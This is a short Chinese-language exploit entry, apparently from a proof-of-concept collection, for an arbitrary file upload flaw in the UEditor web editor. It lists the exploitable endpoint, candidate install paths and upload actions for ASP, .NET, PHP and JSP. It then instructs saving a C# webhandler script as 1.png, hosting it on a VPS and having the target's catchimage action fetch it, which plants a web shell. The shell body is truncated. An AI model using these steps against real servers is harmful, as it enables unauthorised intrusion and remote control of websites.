# ueditor存在任意文件上传漏洞(ASP)

- **系统**：ueditor　|　**类型**：文件上传　|　**CVE**：—
- **请求**：`POST /ueditor/net/controller.ashx?action=catchimage HTTP/1.1`

**请求体 / payload**
```
Ueditor路径：
/ueditor/
/ueditor-1.4.3.3/net/
/ueditor1_4_3_3-utf8-net/utf8-net/
/utf8-net/
上传路径
/ueditor/asp/controller.asp?action=uploadimage
/ueditor/asp/controller.asp?action=uploadfile
/ueditor/net/controller.ashx?action=uploadimage
/ueditor/net/controller.ashx?action=uploadfile
/ueditor/net/controller.ashx?action=catchimage
/ueditor/php/controller.php?action=uploadfile
/ueditor/php/controller.php?action=uploadimage
/ueditor/jsp/controller.jsp?action=uploadfile
/ueditor/jsp/controller.jsp?action=uploadimage
将下面内容保存为1.png，上传至vps，开启一个http服务
<% @ webhandler language="C#" class="AverageHandler" …（脚本共 1744 字，完整版见原文）
```
- **预期**：200　|　—